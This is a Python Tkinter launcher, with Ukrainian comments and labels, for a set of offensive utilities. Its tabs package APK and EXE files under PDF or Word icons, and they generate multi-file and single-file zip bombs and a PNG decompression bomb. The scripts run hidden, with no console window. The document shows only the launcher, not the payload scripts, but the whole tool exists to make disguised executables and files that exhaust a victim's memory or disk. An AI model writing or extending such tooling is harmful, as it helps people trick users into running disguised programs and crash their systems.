"""
Головний інтерфейс для запуску утиліт проєкту.

Вкладки:
  1. Створити APK           → made_apk.py
  2. Створити EXE           → made_exe.py
  3. Створити багатофайлову zip бомбу → multifile-zip-bomb/zip_bomb_multipe.py
  4. Створити однофайлову zip бомбу   → one_file_inside_zip_bomb/zip_bomb_one.py
  5. Створити PNG бомбу               → png_bomb/png_bomb_claud_bst.py
"""

import os
import sys
import shutil
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from pathlib import Path
from typing import Optional

# ── Шляхи до скриптів ────────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    BASE_DIR = Path(sys._MEIPASS)
    EXE_DIR = Path(sys.executable).parent   # папка де лежить .exe
else:
    BASE_DIR = Path(__file__).resolve().parent
    EXE_DIR = BASE_DIR

SCRIPTS = {
    "apk":          BASE_DIR / "made_apk.py",
    "exe":          BASE_DIR / "made_exe.py",
    "zip_multi":    BASE_DIR / "multifile-zip-bomb" / "zip_bomb_multipe.py",
    "zip_one":      BASE_DIR / "one_file_inside_zip_bomb" / "zip_bomb_one.py",
    "png":          BASE_DIR / "png_bomb" / "png_bomb_claud_bst.py",
}

ICONS = {
    "pdf":  str(BASE_DIR / "icons" / "pdf.ico"),
    "word": str(BASE_DIR / "icons" / "word.ico"),
}


# ═══════════════════════════════════════════════════════════════════════
#  Допоміжні функції
# ═══════════════════════════════════════════════════════════════════════

def get_python_executable() -> Optional[str]:
    """Повертає шлях до інтерпретатора Python."""
    if not getattr(sys, 'frozen', False):
        return sys.executable
    return shutil.which("python") or shutil.which("python3")

def run_script_with_input(script: Path, stdin_text: str, log_widget: scrolledtext.ScrolledText,
                          btn: tk.Button, cwd: Optional[Path] = None):
    """Запускає скрипт у фоновому потоці та виводить stdout/stderr у log_widget."""
    python_exe = get_python_executable()
    if not python_exe:
        messagebox.showerror("Помилка", "Python не знайдено!\n\nБудь ласка, встановіть Python 3.12 (або новішу версію, якщо дана вже неактуальна) з офіційного сайту python.org для використання цієї утиліти.")
        return

    def _worker():
        btn.config(state=tk.DISABLED)
        log_widget.config(state=tk.NORMAL)
        log_widget.delete("1.0", tk.END)
        log_widget.insert(tk.END, f"▶ Запуск: {script.name}\n{'─' * 50}\n")
        log_widget.see(tk.END)

        try:
            env = os.environ.copy()
            env.pop("_MEIPASS2", None)
            
            proc = subprocess.Popen(
                [python_exe, str(script)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=str(cwd or script.parent),
                env=env,
                encoding="utf-8",
                errors="replace",
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            if stdin_text:
                proc.stdin.write(stdin_text)
                proc.stdin.flush()
            proc.stdin.close()

            for line in proc.stdout:
                log_widget.insert(tk.END, line)
                log_widget.see(tk.END)

            proc.wait()
            status = "✓ Завершено успішно" if proc.returncode == 0 else f"✗ Код помилки: {proc.returncode}"
            log_widget.insert(tk.END, f"\n{'─' * 50}\n{status}\n")
        except Exception as exc:
            log_widget.insert(tk.END, f"\n✗ Помилка: {exc}\n")
        finally:
            log_widget.see(tk.END)
            log_widget.config(state=tk.DISABLED)
            btn.config(state=tk.NORMAL)

    threading.Thread(target=_worker, daemon=True).start()


def run_script_with_args(script: Path, args: list[str], log_widget: scrolledtext.ScrolledText,
                         btn: tk.Button, cwd: Optional[Path] = None):
    """Запускає скрипт з аргументами командного рядка."""
    python_exe = get_python_executable()
    if not python_exe:
        messagebox.showerror("Помилка", "Python не знайдено!\n\nБудь ласка, встановіть Python 3.12 (або новішу версію) з офіційного сайту python.org для використання цієї утиліти.")
        return

    def _worker():
        btn.config(state=tk.DISABLED)
        log_widget.config(state=tk.NORMAL)
        log_widget.delete("1.0", tk.END)
        log_widget.insert(tk.END, f"▶ Запуск: {script.name} {' '.join(args)}\n{'─' * 50}\n")
        log_widget.see(tk.END)

        try:
            env = os.environ.copy()
            env.pop("_MEIPASS2", None)

            proc = subprocess.Popen(
                [python_exe, str(script)] + args,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=str(cwd or script.parent),
                env=env,
                encoding="utf-8",
                errors="replace",
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            for line in proc.stdout:
                log_widget.insert(tk.END, line)
                log_widget.see(tk.END)

            proc.wait()
            status = "✓ Завершено успішно" if proc.returncode == 0 else f"✗ Код помилки: {proc.returncode}"
            log_widget.insert(tk.END, f"\n{'─' * 50}\n{status}\n")
        except Exception as exc:
            log_widget.insert(tk.END, f"\n✗ Помилка: {exc}\n")
        finally:
            log_widget.see(tk.END)
            log_widget.config(state=tk.DISABLED)
            btn.config(state=tk.NORMAL)

    threading.Thread(target=_worker, daemon=True).start()


# ═══════════════════════════════════════════════════════════════════════
#  Побудова GUI
# ═══════════════════════════════════════════════════════════════════════

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Утиліти проєкту")
        self.geometry("820x620")
        self.minsize(700, 500)
        self.configure(bg="#f0f4f8")
        
        try:
            self.iconbitmap(ICONS["pdf"])
        except Exception:
            pass

        style = ttk.Style(self)
        style.theme_use("clam")

        # ── Глобальні кольори (білий + синій) ─────────────────────────
        BG       = "#f0f4f8"
        FG       = "#1a2a3a"
        ACCENT   = "#2196F3"
        ENTRY_BG = "#ffffff"
        BTN_BG   = "#1976D2"
        BTN_FG   = "#ffffff"
        TAB_BG   = "#d6e4f0"
        TAB_SEL  = "#1976D2"

        style.configure("TNotebook",      background=BG)
        style.configure("TNotebook.Tab",  background=TAB_BG, foreground=FG,
                         padding=[14, 6], font=("Segoe UI", 10))
        style.map("TNotebook.Tab",
                  background=[("selected", TAB_SEL)],
                  foreground=[("selected", "#ffffff")])

        style.configure("TFrame",  background=BG)
        style.configure("TLabel",  background=BG, foreground=FG, font=("Segoe UI", 10))
        style.configure("TButton", background=BTN_BG, foreground=BTN_FG,
                         font=("Segoe UI", 10, "bold"), padding=[10, 4])
        style.map("TButton",
                  background=[("active", ACCENT), ("disabled", "#b0bec5")])
        style.configure("TEntry",  fieldbackground=ENTRY_BG, foreground=FG,
                         insertcolor=FG, font=("Consolas", 10))
        style.configure("TRadiobutton", background=BG, foreground=FG, font=("Segoe UI", 10))
        style.configure("TCombobox", fieldbackground=ENTRY_BG, foreground=FG,
                         font=("Consolas", 10))

        self.log_font = ("Consolas", 9)
        self.log_bg   = "#ffffff"
        self.log_fg   = "#1a2a3a"

        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True, padx=6, pady=6)

        notebook.add(self._build_apk_tab(notebook),       text="  Створити APK  ")
        notebook.add(self._build_exe_tab(notebook),       text="  Створити EXE  ")
        notebook.add(self._build_zip_multi_tab(notebook), text="  Створити багатофайлову zip бомбу  ")
        notebook.add(self._build_zip_one_tab(notebook),   text="  Створити однофайлову zip бомбу  ")
        notebook.add(self._build_png_tab(notebook),       text="  Створити PNG бомбу  ")

    # ── Helpers ───────────────────────────────────────────────────────

    def _make_log(self, parent) -> scrolledtext.ScrolledText:
        log = scrolledtext.ScrolledText(
            parent, height=14, state=tk.DISABLED,
            bg=self.log_bg, fg=self.log_fg, font=self.log_font,
            insertbackground=self.log_fg, relief=tk.FLAT, bd=0,
        )
        return log

    def _row(self, parent, label_text: str, row: int, widget_factory):
        lbl = ttk.Label(parent, text=label_text)
        lbl.grid(row=row, column=0, sticky=tk.W, padx=(10, 6), pady=5)
        widget = widget_factory(parent)
        widget.grid(row=row, column=1, sticky=tk.EW, padx=(0, 10), pady=5)
        return widget

    # ══════════════════════════════════════════════════════════════════
    #  1. Створити APK
    # ══════════════════════════════════════════════════════════════════

    def _build_apk_tab(self, parent) -> ttk.Frame:
        frame = ttk.Frame(parent)
        frame.columnconfigure(1, weight=1)

        r = 0
        ent_name = self._row(frame, "Ім'я файлу:", r, lambda p: ttk.Entry(p)); r += 1

        # Вибір іконки
        icon_var = tk.StringVar(value="builtin")
        ttk.Label(frame, text="Іконка:").grid(row=r, column=0, sticky=tk.W, padx=(10, 6), pady=5)
        rb_frame = ttk.Frame(frame)
        rb_frame.grid(row=r, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        ttk.Radiobutton(rb_frame, text="Вбудована", variable=icon_var, value="builtin").pack(side=tk.LEFT, padx=(0, 12))
        ttk.Radiobutton(rb_frame, text="Своя", variable=icon_var, value="custom").pack(side=tk.LEFT)
        r += 1

        cmb_type = self._row(frame, "Тип іконки (pdf/word):", r,
                             lambda p: ttk.Combobox(p, values=["pdf", "word"], state="readonly")); r += 1
        cmb_type.set("pdf")

        ent_custom = self._row(frame, "Шлях до іконки:", r, lambda p: ttk.Entry(p)); r += 1
        btn_browse = ttk.Button(frame, text="Огляд…",
                                command=lambda: ent_custom.insert(0, filedialog.askopenfilename(
                                    filetypes=[("ICO", "*.ico"), ("All", "*.*")])) or None)
        btn_browse.grid(row=r - 1, column=2, padx=(2, 10))

        log = self._make_log(frame)
        log.grid(row=r, column=0, columnspan=3, sticky="nsew", padx=10, pady=(8, 6)); r += 1
        frame.rowconfigure(r - 1, weight=1)

        def on_run():
            name = ent_name.get().strip()
            if not name:
                messagebox.showwarning("Увага", "Введіть ім'я файлу"); return

            if icon_var.get() == "builtin":
                decision = "y"
                doc_type = cmb_type.get()
                stdin_text = f"{name}\n{decision}\n{doc_type}\n"
            else:
                custom_path = ent_custom.get().strip()
                if not custom_path:
                    messagebox.showwarning("Увага", "Вкажіть шлях до іконки"); return
                stdin_text = f"{name}\nn\n{custom_path}\n"

            run_script_with_input(SCRIPTS["apk"], stdin_text, log, btn_run, cwd=EXE_DIR)

        btn_run = ttk.Button(frame, text="▶  Запустити", command=on_run)
        btn_run.grid(row=r, column=0, columnspan=3, pady=(0, 10))

        return frame

    # ══════════════════════════════════════════════════════════════════
    #  2. Створити EXE
    # ══════════════════════════════════════════════════════════════════

    def _build_exe_tab(self, parent) -> ttk.Frame:
        frame = ttk.Frame(parent)
        frame.columnconfigure(1, weight=1)

        r = 0
        ent_name = self._row(frame, "Ім'я файлу:", r, lambda p: ttk.Entry(p)); r += 1

        icon_var = tk.StringVar(value="builtin")
        ttk.Label(frame, text="Іконка:").grid(row=r, column=0, sticky=tk.W, padx=(10, 6), pady=5)
        rb_frame = ttk.Frame(frame)
        rb_frame.grid(row=r, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        ttk.Radiobutton(rb_frame, text="Вбудована", variable=icon_var, value="builtin").pack(side=tk.LEFT, padx=(0, 12))
        ttk.Radiobutton(rb_frame, text="Своя", variable=icon_var, value="custom").pack(side=tk.LEFT)
        r += 1

        cmb_type = self._row(frame, "Тип іконки (pdf/word):", r,
                             lambda p: ttk.Combobox(p, values=["pdf", "word"], state="readonly")); r += 1
        cmb_type.set("pdf")

        ent_custom = self._row(frame, "Шлях до іконки:", r, lambda p: ttk.Entry(p)); r += 1
        btn_browse = ttk.Button(frame, text="Огляд…",
                                command=lambda: ent_custom.insert(0, filedialog.askopenfilename(
                                    filetypes=[("ICO", "*.ico"), ("All", "*.*")])) or None)
        btn_browse.grid(row=r - 1, column=2, padx=(2, 10))

        log = self._make_log(frame)
        log.grid(row=r, column=0, columnspan=3, sticky="nsew", padx=10, pady=(8, 6)); r += 1
        frame.rowconfigure(r - 1, weight=1)

        def on_run():
            name = ent_name.get().strip()
            if not name:
                messagebox.showwarning("Увага", "Введіть ім'я файлу"); return

            if icon_var.get() == "builtin":
                stdin_text = f"{name}\ny\n{cmb_type.get()}\n"
            else:
                custom_path = ent_custom.get().strip()
                if not custom_path:
                    messagebox.showwarning("Увага", "Вкажіть шлях до іконки"); return
                stdin_text = f"{name}\nn\n{custom_path}\n"

            run_script_with_input(SCRIPTS["exe"], stdin_text, log, btn_run, cwd=EXE_DIR)

        btn_run = ttk.Button(frame, text="▶  Запустити", command=on_run)
        btn_run.grid(row=r, column=0, columnspan=3, pady=(0, 10))

        return frame

    # ══════════════════════════════════════════════════════════════════
    #  3. Створити багатофайлову zip бомбу
    # ══════════════════════════════════════════════════════════════════

    def _build_zip_multi_tab(self, parent) -> ttk.Frame:
        frame = ttk.Frame(parent)
        frame.columnconfigure(1, weight=1)

        r = 0
        ent_name = self._row(frame, "Назва zip файлу:", r, lambda p: ttk.Entry(p)); r += 1

        log = self._make_log(frame)
        log.grid(row=r, column=0, columnspan=2, sticky="nsew", padx=10, pady=(8, 6)); r += 1
        frame.rowconfigure(r - 1, weight=1)

        def on_run():
            name = ent_name.get().strip()
            if not name:
                messagebox.showwarning("Увага", "Введіть назву zip файлу"); return
            stdin_text = f"{name}\n"
            run_script_with_input(SCRIPTS["zip_multi"], stdin_text, log, btn_run, cwd=EXE_DIR)

        btn_run = ttk.Button(frame, text="▶  Запустити", command=on_run)
        btn_run.grid(row=r, column=0, columnspan=2, pady=(0, 10))

        return frame

    # ══════════════════════════════════════════════════════════════════
    #  4. Створити однофайлову zip бомбу
    # ══════════════════════════════════════════════════════════════════

    def _build_zip_one_tab(self, parent) -> ttk.Frame:
        frame = ttk.Frame(parent)
        frame.columnconfigure(1, weight=1)

        r = 0
        ent_name   = self._row(frame, "Назва zip файлу:", r,  lambda p: ttk.Entry(p)); r += 1
        ent_inside = self._row(frame, "Ім'я файлів всередині:", r, lambda p: ttk.Entry(p)); r += 1
        ent_format = self._row(frame, "Формат файлів всередині:", r, lambda p: ttk.Entry(p)); r += 1

        log = self._make_log(frame)
        log.grid(row=r, column=0, columnspan=2, sticky="nsew", padx=10, pady=(8, 6)); r += 1
        frame.rowconfigure(r - 1, weight=1)

        def on_run():
            name = ent_name.get().strip()
            inside = ent_inside.get().strip()
            fmt = ent_format.get().strip()
            if not name:
                messagebox.showwarning("Увага", "Введіть назву zip файлу"); return
            if not inside:
                messagebox.showwarning("Увага", "Введіть ім'я файлів всередині"); return
            if not fmt:
                messagebox.showwarning("Увага", "Введіть формат файлів"); return
            stdin_text = f"{name}\n{inside}\n{fmt}\n"
            run_script_with_input(SCRIPTS["zip_one"], stdin_text, log, btn_run, cwd=EXE_DIR)

        btn_run = ttk.Button(frame, text="▶  Запустити", command=on_run)
        btn_run.grid(row=r, column=0, columnspan=2, pady=(0, 10))

        return frame

    # ══════════════════════════════════════════════════════════════════
    #  5. Створити PNG бомбу
    # ══════════════════════════════════════════════════════════════════

    def _build_png_tab(self, parent) -> ttk.Frame:
        frame = ttk.Frame(parent)
        frame.columnconfigure(1, weight=1)

        r = 0
        ent_width  = self._row(frame, "Ширина (px):", r, lambda p: ttk.Entry(p)); r += 1
        ent_width.insert(0, "1000000")
        ent_height = self._row(frame, "Висота (px):", r, lambda p: ttk.Entry(p)); r += 1
        ent_height.insert(0, "1000000")
        cmb_mode   = self._row(frame, "Режим кольору:", r,
                               lambda p: ttk.Combobox(p, values=["gray", "rgb", "rgba"], state="readonly")); r += 1
        cmb_mode.set("rgba")
        ent_output = self._row(frame, "Ім'я файлу:", r, lambda p: ttk.Entry(p)); r += 1
        ent_output.insert(0, "bomb.png")

        log = self._make_log(frame)
        log.grid(row=r, column=0, columnspan=2, sticky="nsew", padx=10, pady=(8, 6)); r += 1
        frame.rowconfigure(r - 1, weight=1)

        def on_run():
            try:
                w = int(ent_width.get())
                h = int(ent_height.get())
            except ValueError:
                messagebox.showwarning("Увага", "Ширина і висота мають бути числами"); return
            mode = cmb_mode.get()
            output = ent_output.get().strip() or "bomb.png"

            args = ["-W", str(w), "-H", str(h), "-m", mode, "-o", output]
            run_script_with_args(SCRIPTS["png"], args, log, btn_run, cwd=EXE_DIR)

        btn_run = ttk.Button(frame, text="▶  Запустити", command=on_run)
        btn_run.grid(row=r, column=0, columnspan=2, pady=(0, 10))

        return frame


# ═══════════════════════════════════════════════════════════════════════
#  Точка входу
# ═══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import multiprocessing
    multiprocessing.freeze_support()
    app = App()
    app.mainloop()
